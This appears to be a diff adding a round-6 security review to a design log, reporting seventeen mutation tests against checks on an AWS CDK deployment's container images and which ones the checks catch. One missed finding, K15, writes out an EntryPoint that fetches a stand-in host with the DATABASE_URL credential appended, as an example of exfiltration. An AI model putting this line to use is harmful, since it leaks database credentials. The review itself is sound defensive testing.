@@ -166,3 +166,30 @@ The row says the image is PF-7's, by digest, and that migrations run under the o
 - I5, I6 and I7 are unchanged.
 
 **Held:** every round-4 mutation except the four above. J8 is held too: a dummy task definition that makes the task role an "execution role" so the key grant passes is still caught, because the task role then falls into both lists and gets no actions.
+
+## Re-break (round 6)
+
+Verdict: no Major
+
+I read `git diff HEAD~1 HEAD` (23ef8fb), leaving out `product/screens`. `npm test` passes (83/83). I used no `cdk` command and no AWS CLI.
+
+**The five fields turned into locals change nothing.** I synthesized HEAD~1's `service.ts` and HEAD's in two scratch copies of `deploy/cdk` (the same `lib/`, `cdk.json` and `node_modules`, `node bin/app.ts`). All four templates (`xr-staging`, `xr-production` and both `-copy` stacks) are byte-identical. No file in `lib/` or `test/` reads the removed fields.
+
+**`imageFindings`:** I wrote 17 mutations on `xr-production`, each run through `imageFindings` and every other check (baseline: none). 15 are caught:
+- another registry (docker.io, K1);
+- a `:latest` tag on our own repository (K2);
+- our own URI written as a literal string (K3);
+- a sidecar (K4);
+- a third task definition, even with the exact image (K5);
+- a second repository (K6);
+- a second digest parameter, whether its pattern matches (K7) or is open (K8);
+- a loosened pattern (K9);
+- the parameter switched to an SSM type (K10) or given a `Default` (K11), both caught by PF-8rc's `opaque()`;
+- the service running an outside task definition ARN (K12);
+- the migration's `ContainerDefinitions` wrapped in `Fn::If` (K13);
+- a literal account in place of the ARN part (K14);
+- an ECR pull-through cache rule (K16), caught by `typeFindings`.
+
+Missed, both **Minor**:
+- **K15:** the migration container with our own image and `EntryPoint: ["node","-e","fetch('https://x.example/'+…process.env.DATABASE_URL)"]` passes every check. Our image pinned by digest still runs inline code that holds the owner credential. That takes a deliberate change, not a slip, which is why I rank it Minor. Fix: in `imageFindings`, require no `EntryPoint` on either container, and `Command` exactly `["./node_modules/.bin/prisma","migrate","deploy"]` on the migration and absent on the service.
+- **K17:** a `MUTABLE` tag setting on the repository passes. It has no effect while images are run by digest.
